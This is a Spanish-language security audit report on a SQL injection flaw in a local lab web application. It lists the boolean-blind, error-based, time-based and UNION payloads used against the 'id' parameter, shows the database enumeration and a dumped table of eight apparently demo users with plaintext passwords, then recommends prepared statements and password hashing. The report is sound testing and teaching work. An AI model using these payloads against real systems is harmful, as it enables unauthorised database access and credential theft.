# Informe de Auditoría de Seguridad - SQL Injection
**URL Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30  
**Hora:** 15:16 UTC  
**Herramientas utilizadas:** curl, sqlmap 1.10.2  

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió el acceso completo a la base de datos `sqli_demo`, incluyendo la extracción de credenciales de 8 usuarios.

---

## 2. Descripción de la Aplicación

La aplicación web presenta un formulario de búsqueda de usuarios accesible vía GET:

```
GET /?id=<valor>&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

El parámetro `id` se inserta directamente en una consulta SQL sin sanitización, tal como se evidencia en el archivo `/var/www/html/low.php` (línea 11).

---

## 3. Vulnerabilidades Detectadas

### 3.1 SQL Injection - Parámetro `id` (CRÍTICA)

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection |
| **Severidad** | Crítica (CVSS 9.8) |
| **Parámetro vulnerable** | `id` (GET) |
| **DBMS** | MySQL >= 5.1 (MariaDB fork) |
| **Servidor web** | Apache 2.4.65 |
| **Tecnología** | PHP 8.1.33 |
| **SO del servidor** | Linux Debian |

#### Evidencia de vulnerabilidad

Al insertar una comilla simple `'` en el parámetro `id`, la aplicación devuelve un error SQL explícito:

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma que la entrada del usuario se concatena directamente en la consulta SQL.

#### Tipos de inyección identificados

1. **Boolean-based blind**: `id=1' OR NOT 9498=9498#`
2. **Error-based**: `id=1' AND EXTRACTVALUE(4916,CONCAT(0x5c,...))-- XbML`
3. **Time-based blind**: `id=1' AND (SELECT 9954 FROM (SELECT(SLEEP(5)))VhDO)-- ciFu`
4. **UNION query (2 columnas)**: `id=1' UNION ALL SELECT NULL,CONCAT(...)#`

---

## 4. Explotación

### 4.1 Enumeración de bases de datos

Mediante UNION injection se enumeraron las bases de datos disponibles:

```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### 4.2 Enumeración de tablas

Base de datos objetivo: `sqli_demo`

```
+-------+
| users |
+-------+
```

### 4.3 Extracción de datos - Tabla `users`

Se extrajeron completamente las credenciales de todos los usuarios:

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas se almacenan en texto plano**, lo que constituye una vulnerabilidad adicional grave.

---

## 5. Impacto

- **Confidencialidad**: Acceso completo a todos los datos de usuarios, incluyendo credenciales en texto plano.
- **Integridad**: Posibilidad de modificar o eliminar datos de la base de datos.
- **Disponibilidad**: Posibilidad de ejecutar operaciones destructivas (DROP, TRUNCATE).
- **Escalada**: Las credenciales obtenidas podrían permitir acceso a otras partes del sistema.

---

## 6. Recomendaciones

1. **Usar consultas preparadas (Prepared Statements)** con parámetros enlazados:
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y filtrar la entrada**: Verificar que el parámetro `id` sea un entero antes de usarlo.

3. **Hashear las contraseñas**: Usar `password_hash()` con bcrypt en lugar de almacenarlas en texto plano.

4. **Principio de mínimo privilegio**: El usuario de base de datos de la aplicación solo debe tener los permisos estrictamente necesarios (SELECT en tablas específicas).

5. **Deshabilitar mensajes de error detallados** en producción para evitar revelar información sensible del sistema.

6. **Implementar WAF** (Web Application Firewall) como capa adicional de protección.

---

## 7. Conclusión

La aplicación web presenta una vulnerabilidad crítica de SQL Injection de nivel básico (sin ningún tipo de sanitización), que permitió la extracción completa de la base de datos `sqli_demo` incluyendo credenciales de 8 usuarios en texto plano. Se recomienda corrección inmediata mediante el uso de consultas preparadas y el hash seguro de contraseñas.
